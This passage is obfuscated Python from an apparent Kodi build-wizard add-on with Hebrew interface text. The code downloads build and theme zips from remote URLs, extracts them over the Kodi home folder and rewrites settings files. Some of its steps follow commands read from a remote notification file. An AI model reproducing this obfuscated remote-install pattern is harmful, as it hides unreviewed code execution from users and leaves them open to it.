			OO00O00O000OOO0O0 =open (OOOO00O00OOO0OOO0 ,'w')#line:3889
			OO00O00O000OOO0O0 .write (O000OOOOO00OO0O00 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0OO0OO0OO0OOO000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3890
			OO00O00O000OOO0O0 .close ()#line:3891
		except :#line:3892
				pass #line:3893
		wiz .kodi17Fix ()#line:3894
		OOOO00O00OOO0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3895
		try :#line:3896
			OO00O00O000OOO0O0 =open (OOOO00O00OOO0OOO0 ,'r')#line:3897
			O000OOOOO00OO0O00 =OO00O00O000OOO0O0 .read ()#line:3898
			OO00O00O000OOO0O0 .close ()#line:3899
			OO00000OOO0OOO00O ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3900
			O0OO0OO0OO0OOO000 =re .compile (OO00000OOO0OOO00O ).findall (O000OOOOO00OO0O00 )[0 ]#line:3901
			OO00O00O000OOO0O0 =open (OOOO00O00OOO0OOO0 ,'w')#line:3902
			OO00O00O000OOO0O0 .write (O000OOOOO00OO0O00 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0OO0OO0OO0OOO000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3903
			OO00O00O000OOO0O0 .close ()#line:3904
		except :#line:3905
				pass #line:3906
		swapSkins ('skin.Premium.mod')#line:3907
def buildWizard (OOOO000000OO00O0O ,OOOO00OO00OO00O0O ,theme =None ,over =False ):#line:3910
	O0O000O00O0O0O0O0 =xbmcgui .DialogBusy ()#line:3911
	O0O000O00O0O0O0O0 .create ()#line:3912
	if over ==False :#line:3913
		O0O0O00OO0OO0OO00 =wiz .checkBuild (OOOO000000OO00O0O ,'url')#line:3914
		if USERNAME =='':#line:3915
			ADDON .openSettings ()#line:3916
			sys .exit ()#line:3917
		if PASSWORD =='':#line:3918
			ADDON .openSettings ()#line:3919
			sys .exit ()#line:3920
		if BUILDNAME =='':#line:3922
			O00OOO0OOO0000OOO =u_list (SPEEDFILE )#line:3923
			(O00OOO0OOO0000OOO )#line:3924
		if O0O0O00OO0OO0OO00 ==False :#line:3925
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3930
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3931
			return #line:3932
		O000OOO00O0OOOO0O =wiz .workingURL (O0O0O00OO0OO0OO00 )#line:3933
		if O000OOO00O0OOOO0O ==False :#line:3934
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O000OOO00O0OOOO0O ))#line:3935
			return #line:3936
	if OOOO00OO00OO00O0O =='gui':#line:3937
		if OOOO000000OO00O0O ==BUILDNAME :#line:3938
			if over ==True :O0OOOO0OOO00O0O0O =1 #line:3939
			else :O0OOOO0OOO00O0O0O =1 #line:3940
		else :#line:3941
			O0OOOO0OOO00O0O0O =1 #line:3942
		if O0OOOO0OOO00O0O0O :#line:3943
			remove_addons ()#line:3944
			remove_addons2 ()#line:3945
			debridit .debridIt ('update','all')#line:3946
			traktit .traktIt ('update','all')#line:3947
			O0000OOOOO0OOOOO0 =wiz .checkBuild (OOOO000000OO00O0O ,'gui')#line:3948
			O0OOO0OO0OO0OO000 =OOOO000000OO00O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3949
			if not wiz .workingURL (O0000OOOOO0OOOOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3950
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3951
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000000OO00O0O ),'','אנא המתן')#line:3952
			OOOO0OO000O0000O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOO0OO0OO0OO000 )#line:3953
			try :os .remove (OOOO0OO000O0000O0 )#line:3954
			except :pass #line:3955
			logging .warning (O0000OOOOO0OOOOO0 )#line:3956
			if 'google'in O0000OOOOO0OOOOO0 :#line:3957
			   O000O0O0O0O0000O0 =googledrive_download (O0000OOOOO0OOOOO0 ,OOOO0OO000O0000O0 ,DP ,wiz .checkBuild (OOOO000000OO00O0O ,'filesize'))#line:3958
			else :#line:3961
			  downloader .download (O0000OOOOO0OOOOO0 ,OOOO0OO000O0000O0 ,DP )#line:3962
			xbmc .sleep (100 )#line:3963
			O0O00000O00O00OOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000000OO00O0O )#line:3964
			DP .update (0 ,O0O00000O00O00OOO ,'','אנא המתן')#line:3965
			extract .all (OOOO0OO000O0000O0 ,HOME ,DP ,title =O0O00000O00O00OOO )#line:3966
			DP .close ()#line:3967
			wiz .defaultSkin ()#line:3968
			wiz .lookandFeelData ('save')#line:3969
			wiz .kodi17Fix ()#line:3970
			if KODIV >=18 :#line:3971
				skindialogsettind18 ()#line:3972
			debridit .debridIt ('restore','all')#line:3973
			traktit .traktIt ('restore','all')#line:3974
			if INSTALLMETHOD ==1 :OOO00O00OOOOOOOOO =1 #line:3976
			elif INSTALLMETHOD ==2 :OOO00O00OOOOOOOOO =0 #line:3977
			else :DP .close ()#line:3978
			OO00OO0OO0O0OO000 =(NOTIFICATION2 )#line:3979
			OOO00OO0OO0OOOO0O =urllib2 .urlopen (OO00OO0OO0O0OO000 )#line:3980
			O000OO0O0O000OO0O =OOO00OO0OO0OOOO0O .readlines ()#line:3981
			O0O0OOOO0OOO0OOO0 =0 #line:3982
			for OO000OO00O00O00OO in O000OO0O0O000OO0O :#line:3985
				if OO000OO00O00O00OO .split (' ==')[0 ]=="noreset"or OO000OO00O00O00OO .split ()[0 ]=="noreset":#line:3986
					xbmc .executebuiltin ("ReloadSkin()")#line:3988
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3989
					update_Votes ()#line:3990
					indicatorfastupdate ()#line:3991
				if OO000OO00O00O00OO .split (' ==')[0 ]=="reset"or OO000OO00O00O00OO .split ()[0 ]=="reset":#line:3992
					update_Votes ()#line:3994
					indicatorfastupdate ()#line:3995
					resetkodi ()#line:3996
		else :#line:4005
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4006
	if OOOO00OO00OO00O0O =='gui2':#line:4007
		if OOOO000000OO00O0O ==BUILDNAME :#line:4008
			if over ==True :O0OOOO0OOO00O0O0O =1 #line:4009
			else :O0OOOO0OOO00O0O0O =1 #line:4010
		else :#line:4011
			O0OOOO0OOO00O0O0O =1 #line:4012
		if O0OOOO0OOO00O0O0O :#line:4013
			remove_addons ()#line:4014
			remove_addons2 ()#line:4015
			O0000OOOOO0OOOOO0 =wiz .checkBuild (OOOO000000OO00O0O ,'gui')#line:4016
			O0OOO0OO0OO0OO000 =OOOO000000OO00O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4017
			if not wiz .workingURL (O0000OOOOO0OOOOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4018
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4019
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000000OO00O0O ),'','אנא המתן')#line:4020
			OOOO0OO000O0000O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOO0OO0OO0OO000 )#line:4021
			try :os .remove (OOOO0OO000O0000O0 )#line:4022
			except :pass #line:4023
			logging .warning (O0000OOOOO0OOOOO0 )#line:4024
			if 'google'in O0000OOOOO0OOOOO0 :#line:4025
			   O000O0O0O0O0000O0 =googledrive_download (O0000OOOOO0OOOOO0 ,OOOO0OO000O0000O0 ,DP ,wiz .checkBuild (OOOO000000OO00O0O ,'filesize'))#line:4026
			else :#line:4029
			  downloader .download (O0000OOOOO0OOOOO0 ,OOOO0OO000O0000O0 ,DP )#line:4030
			xbmc .sleep (100 )#line:4031
			O0O00000O00O00OOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000000OO00O0O )#line:4032
			DP .update (0 ,O0O00000O00O00OOO ,'','אנא המתן')#line:4033
			extract .all (OOOO0OO000O0000O0 ,HOME ,DP ,title =O0O00000O00O00OOO )#line:4034
			DP .close ()#line:4035
			wiz .defaultSkin ()#line:4036
			wiz .lookandFeelData ('save')#line:4037
			if INSTALLMETHOD ==1 :OOO00O00OOOOOOOOO =1 #line:4040
			elif INSTALLMETHOD ==2 :OOO00O00OOOOOOOOO =0 #line:4041
			else :DP .close ()#line:4042
		else :#line:4044
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4045
	elif OOOO00OO00OO00O0O =='fresh':#line:4046
		freshStart (OOOO000000OO00O0O )#line:4047
	elif OOOO00OO00OO00O0O =='normal':#line:4048
		if url =='normal':#line:4049
			if KEEPTRAKT =='true':#line:4050
				traktit .autoUpdate ('all')#line:4051
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4052
			if KEEPREAL =='true':#line:4053
				debridit .autoUpdate ('all')#line:4054
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4055
			if KEEPLOGIN =='true':#line:4056
				loginit .autoUpdate ('all')#line:4057
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4058
		OO000OOO0O000O000 =int (KODIV );OOO0O0O00000OOOOO =int (float (wiz .checkBuild (OOOO000000OO00O0O ,'kodi')))#line:4059
		if not OO000OOO0O000O000 ==OOO0O0O00000OOOOO :#line:4060
			if OO000OOO0O000O000 ==16 and OOO0O0O00000OOOOO <=15 :O0000O0OOO00O0OO0 =False #line:4061
			else :O0000O0OOO00O0OO0 =True #line:4062
		else :O0000O0OOO00O0OO0 =False #line:4063
		if O0000O0OOO00O0OO0 ==True :#line:4064
			O0O0OOOO00O000000 =1 #line:4065
		else :#line:4066
			if not over ==False :O0O0OOOO00O000000 =1 #line:4067
			else :O0O0OOOO00O000000 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4068
		if O0O0OOOO00O000000 :#line:4069
			wiz .clearS ('build')#line:4070
			O0000OOOOO0OOOOO0 =wiz .checkBuild (OOOO000000OO00O0O ,'url')#line:4071
			O0OOO0OO0OO0OO000 =OOOO000000OO00O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4072
			if not wiz .workingURL (O0000OOOOO0OOOOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4073
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4074
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OOOO000000OO00O0O ,wiz .checkBuild (OOOO000000OO00O0O ,'version')),'','אנא המתן')#line:4075
			OOOO0OO000O0000O0 =os .path .join (PACKAGES ,'%s.zip'%O0OOO0OO0OO0OO000 )#line:4076
			try :os .remove (OOOO0OO000O0000O0 )#line:4077
			except :pass #line:4078
			logging .warning (O0000OOOOO0OOOOO0 )#line:4079
			if 'google'in O0000OOOOO0OOOOO0 :#line:4080
			   O000O0O0O0O0000O0 =googledrive_download (O0000OOOOO0OOOOO0 ,OOOO0OO000O0000O0 ,DP ,wiz .checkBuild (OOOO000000OO00O0O ,'filesize'))#line:4081
			else :#line:4084
			  downloader .download (O0000OOOOO0OOOOO0 ,OOOO0OO000O0000O0 ,DP )#line:4085
			xbmc .sleep (1000 )#line:4086
			O0O00000O00O00OOO ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000000OO00O0O ,wiz .checkBuild (OOOO000000OO00O0O ,'version'))#line:4087
			DP .update (0 ,O0O00000O00O00OOO ,'','אנא המתן...')#line:4088
			OOO0OOO0OOOOO0OOO ,OO0O0OO0000OOOOOO ,O0O000000O00OOOOO =extract .all (OOOO0OO000O0000O0 ,HOME ,DP ,title =O0O00000O00O00OOO )#line:4089
			if int (float (OOO0OOO0OOOOO0OOO ))>0 :#line:4090
				try :#line:4091
					wiz .fixmetas ()#line:4092
				except :pass #line:4093
				wiz .lookandFeelData ('save')#line:4094
				wiz .defaultSkin ()#line:4095
				wiz .setS ('buildname',OOOO000000OO00O0O )#line:4097
				wiz .setS ('buildversion',wiz .checkBuild (OOOO000000OO00O0O ,'version'))#line:4098
				wiz .setS ('buildtheme','')#line:4099
				wiz .setS ('latestversion',wiz .checkBuild (OOOO000000OO00O0O ,'version'))#line:4100
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4101
				wiz .setS ('installed','true')#line:4102
				wiz .setS ('extract',str (OOO0OOO0OOOOO0OOO ))#line:4103
				wiz .setS ('errors',str (OO0O0OO0000OOOOOO ))#line:4104
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO0OOO0OOOOO0OOO ,OO0O0OO0000OOOOOO ))#line:4105
				fastupdatefirstbuild (NOTEID )#line:4106
				wiz .kodi17Fix ()#line:4107
				skin_homeselect ()#line:4108
				skin_lower ()#line:4109
				rdbuildinstall ()#line:4110
				try :gaiaserenaddon ()#line:4111
				except :pass #line:4112
				adults18 ()#line:4113
				skinfix18 ()#line:4114
				try :os .remove (OOOO0OO000O0000O0 )#line:4116
				except :pass #line:4117
				OO0000OO0000O0OO0 =(ADDON .getSetting ("auto_rd"))#line:4118
				if OO0000OO0000O0OO0 =='true':#line:4119
					try :#line:4120
						setautorealdebrid ()#line:4121
					except :pass #line:4122
				try :#line:4123
					autotrakt ()#line:4124
				except :pass #line:4125
				O00OOOOOO0OO0O000 =(ADDON .getSetting ("imdb_on"))#line:4126
				if O00OOOOOO0OO0O000 =='true':#line:4127
					imdb_synck ()#line:4128
				iptvset ()#line:4129
				DP .close ()#line:4137
				OO00O000O0OOOO00O =wiz .themeCount (OOOO000000OO00O0O )#line:4138
				builde_Votes ()#line:4139
				indicator ()#line:4140
				if not OO00O000O0OOOO00O ==False :#line:4141
					buildWizard (OOOO000000OO00O0O ,'theme')#line:4142
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4143
				if INSTALLMETHOD ==1 :OOO00O00OOOOOOOOO =1 #line:4144
				elif INSTALLMETHOD ==2 :OOO00O00OOOOOOOOO =0 #line:4145
				else :resetkodi ()#line:4146
				if OOO00O00OOOOOOOOO ==1 :wiz .reloadFix ()#line:4148
				else :wiz .killxbmc (True )#line:4149
			else :#line:4150
				if isinstance (OO0O0OO0000OOOOOO ,unicode ):#line:4151
					O0O000000O00OOOOO =O0O000000O00OOOOO .encode ('utf-8')#line:4152
				O0O000O000O0O0O0O =open (OOOO0OO000O0000O0 ,'r')#line:4153
				O00OO0O0OO00OO00O =O0O000O000O0O0O0O .read ()#line:4154
				OOOOOOO0OO0OOOOOO =''#line:4155
				for O0O000OO00O0O0OOO in O000O0O0O0O0000O0 :#line:4156
				  OOOOOOO0OO0OOOOOO ='key: '+OOOOOOO0OO0OOOOOO +'\n'+O0O000OO00O0O0OOO #line:4157
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O000000O00OOOOO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOOOOOO0OO0OOOOOO )#line:4158
		else :#line:4159
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4160
	elif OOOO00OO00OO00O0O =='theme':#line:4161
		if theme ==None :#line:4162
			OO00O000O0OOOO00O =wiz .checkBuild (OOOO000000OO00O0O ,'theme')#line:4163
			O00OO0OOO0OO00OOO =[]#line:4164
			if not OO00O000O0OOOO00O =='http://'and wiz .workingURL (OO00O000O0OOOO00O )==True :#line:4165
				O00OO0OOO0OO00OOO =wiz .themeCount (OOOO000000OO00O0O ,False )#line:4166
				if len (O00OO0OOO0OO00OOO )>0 :#line:4167
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOOO000000OO00O0O ,COLOR1 ,len (O00OO0OOO0OO00OOO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4168
						wiz .log ("Theme List: %s "%str (O00OO0OOO0OO00OOO ))#line:4169
						O0O00OO00OOOO0O0O =DIALOG .select (ADDONTITLE ,O00OO0OOO0OO00OOO )#line:4170
						wiz .log ("Theme install selected: %s"%O0O00OO00OOOO0O0O )#line:4171
						if not O0O00OO00OOOO0O0O ==-1 :theme =O00OO0OOO0OO00OOO [O0O00OO00OOOO0O0O ];OO0O0OOOO0000O000 =True #line:4172
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4173
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4174
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4175
		else :OO0O0OOOO0000O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOOO000000OO00O0O ,wiz .checkBuild (OOOO000000OO00O0O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4176
		if OO0O0OOOO0000O000 :#line:4177
			OOOO000OOO0OOO0O0 =wiz .checkTheme (OOOO000000OO00O0O ,theme ,'url')#line:4178
			O0OOO0OO0OO0OO000 =OOOO000000OO00O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4179
			if not wiz .workingURL (OOOO000OOO0OOO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4180
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4181
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4182
			OOOO0OO000O0000O0 =os .path .join (PACKAGES ,'%s.zip'%O0OOO0OO0OO0OO000 )#line:4183
			try :os .remove (OOOO0OO000O0000O0 )#line:4184
			except :pass #line:4185
			downloader .download (OOOO000OOO0OOO0O0 ,OOOO0OO000O0000O0 ,DP )#line:4186
			xbmc .sleep (1000 )#line:4187
			DP .update (0 ,"","Installing %s "%OOOO000000OO00O0O )#line:4188
			OO0O0OOO0O00O0O0O =False #line:4189
			if url not in ["fresh","normal"]:#line:4190
				OO0O0OOO0O00O0O0O =testTheme (OOOO0OO000O0000O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4191
				OOO000OO00O0OOO0O =testGui (OOOO0OO000O0000O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4192
				if OO0O0OOO0O00O0O0O ==True :#line:4193
					wiz .lookandFeelData ('save')#line:4194
					O0O0O00OOO0000O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4195
					OO0O0OO0000O000O0 =xbmc .getSkinDir ()#line:4196
					skinSwitch .swapSkins (O0O0O00OOO0000O00 )#line:4198
					O000OO0O0O000OO0O =0 #line:4199
					xbmc .sleep (1000 )#line:4200
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000OO0O0O000OO0O <150 :#line:4201
						O000OO0O0O000OO0O +=1 #line:4202
						xbmc .sleep (1000 )#line:4203
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4204
						wiz .ebi ('SendClick(11)')#line:4205
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4206
					xbmc .sleep (1000 )#line:4207
			O0O00000O00O00OOO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4208
			DP .update (0 ,O0O00000O00O00OOO ,'','אנא המתן')#line:4209
			OOO0OOO0OOOOO0OOO ,OO0O0OO0000OOOOOO ,O0O000000O00OOOOO =extract .all (OOOO0OO000O0000O0 ,HOME ,DP ,title =O0O00000O00O00OOO )#line:4210
			wiz .setS ('buildtheme',theme )#line:4211
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOO0OOO0OOOOO0OOO ,OO0O0OO0000OOOOOO ))#line:4212
			DP .close ()#line:4213
			if url not in ["fresh","normal"]:#line:4214
				wiz .forceUpdate ()#line:4215
				if KODIV >=17 :wiz .kodi17Fix ()#line:4216
				if OOO000OO00O0OOO0O ==True :#line:4217
					wiz .lookandFeelData ('save')#line:4218
					wiz .defaultSkin ()#line:4219
					OO0O0OO0000O000O0 =wiz .getS ('defaultskin')#line:4220
					skinSwitch .swapSkins (OO0O0OO0000O000O0 )#line:4221
					O000OO0O0O000OO0O =0 #line:4222
					xbmc .sleep (1000 )#line:4223
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000OO0O0O000OO0O <150 :#line:4224
						O000OO0O0O000OO0O +=1 #line:4225
						xbmc .sleep (1000 )#line:4226
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4228
						wiz .ebi ('SendClick(11)')#line:4229
					wiz .lookandFeelData ('restore')#line:4230
				elif OO0O0OOO0O00O0O0O ==True :#line:4231
					skinSwitch .swapSkins (OO0O0OO0000O000O0 )#line:4232
					O000OO0O0O000OO0O =0 #line:4233
					xbmc .sleep (1000 )#line:4234
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000OO0O0O000OO0O <150 :#line:4235
						O000OO0O0O000OO0O +=1 #line:4236
						xbmc .sleep (1000 )#line:4237
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4239
						wiz .ebi ('SendClick(11)')#line:4240
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4241
					wiz .lookandFeelData ('restore')#line:4242
				else :#line:4243
					wiz .ebi ("ReloadSkin()")#line:4244
					xbmc .sleep (1000 )#line:4245
					wiz .ebi ("Container.Refresh")#line:4246
		else :#line:4247
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4248
def skin_homeselect ():#line:4252
	try :#line:4254
		OO00OOOO0O0OO000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4255
		O0OOOO0O0000O000O =open (OO00OOOO0O0OO000O ,'r')#line:4257
		O0O0OO0O0O0O0000O =O0OOOO0O0000O000O .read ()#line:4258
		O0OOOO0O0000O000O .close ()#line:4259
		OOO0O00O00OOOOO00 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4260
		O0OOOO0O0O0O00000 =re .compile (OOO0O00O00OOOOO00 ).findall (O0O0OO0O0O0O0000O )[0 ]#line:4261
		O0OOOO0O0000O000O =open (OO00OOOO0O0OO000O ,'w')#line:4262
		O0OOOO0O0000O000O .write (O0O0OO0O0O0O0000O .replace ('<setting id="HomeS" type="string%s/setting>'%O0OOOO0O0O0O00000 ,'<setting id="HomeS" type="string"></setting>'))#line:4263
		O0OOOO0O0000O000O .close ()#line:4264
	except :#line:4265
		pass #line:4266
def skin_lower ():#line:4269
	OOOO00O00OO0O0O00 =(ADDON .getSetting ("lower"))#line:4270
	if OOOO00O00OO0O0O00 =='true':#line:4271
		try :#line:4274
			O000O000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4275
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'r')#line:4277
			O000O0O00OO0O0OOO =O00OO0OOO0OOOO0OO .read ()#line:4278
			O00OO0OOO0OOOO0OO .close ()#line:4279
			O0O00OO0OOOOOOO0O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4280
			OO000OO0O0000OO00 =re .compile (O0O00OO0OOOOOOO0O ).findall (O000O0O00OO0O0OOO )[0 ]#line:4281
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'w')#line:4282
			O00OO0OOO0OOOO0OO .write (O000O0O00OO0O0OOO .replace ('<setting id="none_widget" type="bool%s/setting>'%OO000OO0O0000OO00 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4283
			O00OO0OOO0OOOO0OO .close ()#line:4284
			O000O000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4286
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'r')#line:4288
			O000O0O00OO0O0OOO =O00OO0OOO0OOOO0OO .read ()#line:4289
			O00OO0OOO0OOOO0OO .close ()#line:4290
			O0O00OO0OOOOOOO0O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4291
			OO000OO0O0000OO00 =re .compile (O0O00OO0OOOOOOO0O ).findall (O000O0O00OO0O0OOO )[0 ]#line:4292
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'w')#line:4293
			O00OO0OOO0OOOO0OO .write (O000O0O00OO0O0OOO .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OO000OO0O0000OO00 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4294
			O00OO0OOO0OOOO0OO .close ()#line:4295
			O000O000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4297
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'r')#line:4299
			O000O0O00OO0O0OOO =O00OO0OOO0OOOO0OO .read ()#line:4300
			O00OO0OOO0OOOO0OO .close ()#line:4301
			O0O00OO0OOOOOOO0O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4302
			OO000OO0O0000OO00 =re .compile (O0O00OO0OOOOOOO0O ).findall (O000O0O00OO0O0OOO )[0 ]#line:4303
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'w')#line:4304
			O00OO0OOO0OOOO0OO .write (O000O0O00OO0O0OOO .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OO000OO0O0000OO00 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4305
			O00OO0OOO0OOOO0OO .close ()#line:4306
			O000O000OOO000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4310
			O00OO0OOO0OOOO0OO =open (O000O000OOO000OO0 ,'r')#line:4312
			O000O0O00OO0O0OOO =O00OO0OOO0OOOO0OO .read ()#line:4313
			O00OO0OOO0OOOO0OO .close ()#line:4314
